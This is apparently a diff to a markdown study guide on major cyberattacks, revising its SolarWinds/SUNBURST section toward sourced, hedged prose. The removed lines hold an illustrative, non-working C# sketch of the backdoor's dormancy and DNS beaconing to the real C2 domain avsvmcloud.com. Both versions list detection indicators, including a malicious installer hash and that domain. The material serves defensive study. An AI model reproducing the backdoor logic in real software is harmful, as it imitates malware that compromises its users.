@@ -1176,109 +1176,48 @@ WannaCry Kill Chain:
 
 ![A malicious Orion binary passes through legitimate signing and distribution; only selected environments receive follow-on attacker activity](./assets/diagrams/solarwinds-update-trust-and-follow-on.svg)
 
-*Original conceptual diagram based on [CISA's AA20-352A advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a). Delivery, backdoor communications, and interactive follow-on activity require separate evidence. A valid signature does not demonstrate harmless code, and receiving an affected update does not establish the same outcome for every organization.*
+*Original conceptual diagram based on [CISA's AA20-352A advisory](https://content.govdelivery.com/accounts/USDHSCISA/bulletins/2b1b32d) and [SolarWinds' investigation updates](https://www.solarwinds.com/blog/an-investigative-update-of-the-cyberattack). Delivery, backdoor communications, and interactive follow-on activity require separate evidence. A valid signature does not demonstrate harmless code, and receiving an affected update does not establish the same outcome for every organization.*
 
 ### Overview
-**Target:** SolarWinds Orion platform  
-**Year:** December 2020 (discovered)  
-**Type:** Supply chain attack  
-**Attribution:** APT29 (Cozy Bear) - Russian SVR
+
+**Target:** SolarWinds Orion software supply chain  
+**Disclosure:** FireEye notified SolarWinds on December 12, 2020; the incident became public the following day  
+**Attribution:** The U.S. government attributed the campaign to Russia's Foreign Intelligence Service (SVR); see CISA's advisory for scope and attribution context
 
 ### Attack Timeline
 
-```
-2019-09 : Initial compromise of SolarWinds
-2020-03 : Trojanized update released (version 2019.4 HF 5)
-2020-12 : Attack discovered by FireEye
-2021    : Ongoing investigation and remediation
-```
+| Period | Evidence-based summary |
+|---|---|
+| September 2019 | SolarWinds later identified this as the earliest suspicious activity in its internal systems; it is not necessarily the first attacker access. |
+| October 2019 | SolarWinds reported a test run of code insertion into Orion builds. |
+| February 2020 | SolarWinds reported malicious code insertion into Orion builds began. |
+| March–June 2020 | Trojanized Orion updates were released. |
+| December 2020 | FireEye notified SolarWinds on December 12; FireEye and SolarWinds made public disclosures on December 13. |
 
 ### Attack Chain
 
-```
-SolarWinds Compromise:
-├── Stage 1: Supply Chain Infiltration
-│   └── Compromise SolarWinds build system
-├── Stage 2: Trojanized Update
-│   ├── SUNBURST backdoor inserted
-│   └── Signed with legitimate certificate
-├── Stage 3: Distribution
-│   └── 18,000+ organizations received update
-├── Stage 4: Selective Activation
-│   ├── 2-week dormancy period
-│   ├── Targeted ~100 organizations
-│   └── Government and Fortune 500 focus
-└── Stage 5: Post-Exploitation
-    ├── Credential theft
-    ├── Lateral movement
-    └── Data exfiltration
-```
+- **Build compromise:** The attackers inserted SUNBURST into the Orion build process, outside the ordinary source-code repository workflow described by SolarWinds.
+- **Signed distribution:** Affected updates were digitally signed and distributed through the vendor channel. The signature established the signing identity and file integrity after signing, not the safety of the build contents.
+- **Delayed and selective activity:** CISA reported a 12–14 day delay before SUNBURST execution. The backdoor used DNS for command-and-control and selected victims for additional activity.
+- **Different outcome by environment:** SolarWinds reported that fewer than 18,000 customers had an installation of an affected Orion version. Download, installation, backdoor activation, and hands-on follow-on compromise are distinct states; the number of affected builds is not a count of confirmed intrusions.
+- **Multiple initial-access paths:** CISA also documented initial-access vectors beyond Orion. Do not attribute every compromise associated with the broader campaign to SUNBURST alone.
 
-### Technical Analysis
+### Detection & Response
 
-```csharp
-// SUNBURST backdoor analysis
-// Malicious code injected into SolarWinds.Orion.Core.BusinessLayer.dll
-
-public class OrionImprovementBusinessLayer
-{
-    // Legitimate-looking class name
-    
-    public void UpdateAsync()
-    {
-        // Dormancy period
-        Thread.Sleep(TimeSpan.FromMinutes(12960)); // ~9 days
-        
-        // C2 communication via DNS
-        string c2Domain = GenerateDomain();
-        DnsQuery(c2Domain);
-        
-        // If response received, download secondary payload
-    }
-    
-    private string GenerateDomain()
-    {
-        // DGA (Domain Generation Algorithm)
-        // Uses legitimate-looking subdomains
-        return $"{userId}.appsync-api.{region}.avsvmcloud.com";
-    }
-}
-```
-
-### Detection Methods
-
-```bash
-# Check for indicators of compromise
-
-# 1. Check Orion version
-# Vulnerable versions: 2019.4 HF 5, 2020.2 RC 1, 2020.2 RC 2
-
-# 2. Check for SUNBURST backdoor
-Get-FileHash "C:\Program Files (x86)\SolarWinds\Orion\SolarWinds.Orion.Core.BusinessLayer.dll"
-
-# Known malicious hash:
-# d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600
-
-# 3. Check for C2 domains
-# Look for DNS queries to:
-# *.avsvmcloud.com
-# *.appsync-api.*.avsvmcloud.com
-
-# 4. Check firewall logs for outbound connections
-netsh advfirewall firewall show rule name=all | findstr SolarWinds
-```
+- Use the affected-version list, indicators, and response steps in [CISA AA20-352A](https://content.govdelivery.com/accounts/USDHSCISA/bulletins/2b1b32d) and the vendor's [security advisory](https://www.solarwinds.com/sa-overview/securityadvisory/faq). Confirm asset versions and update status from trusted inventory.
+- The SHA-256 value `d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600` was published for a known trojanized Orion installer. Treat it as one historical indicator, not a complete detector or a clearance test.
+- Correlate DNS, proxy, endpoint, and identity telemetry with the exact indicators and time windows in the advisory. SUNBURST used subdomains under `avsvmcloud.com`; a domain match needs context, and the absence of a match does not prove a clean environment.
 
 ### Lessons Learned
-- **Supply chain attacks** are highly effective
-- **Code signing** alone doesn't ensure trust
-- **Network segmentation** limits lateral movement
-- **Behavioral analysis** can detect sophisticated threats
-- **Zero trust architecture** is essential
+
+- **Build integrity:** Protect and independently monitor source, build agents, signing keys, release pipelines, and artifact provenance.
+- **Code signing:** A valid signature is necessary evidence about the signed artifact, not evidence that the build process was uncompromised.
+- **Response scope:** Separate receipt of a vulnerable update from activation, follow-on access, and confirmed data access.
+- **Attribution:** Preserve uncertainty and distinguish the U.S. government's attribution from technical indicators observed in a specific environment.
 
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
 
 ---
-
 ## Carbanak APT Campaign
 
 ![Spear-phishing establishes access, observation reveals bank workflows, and lateral movement can enable financial fraud](./assets/diagrams/carbanak-intrusion-to-financial-fraud.svg)
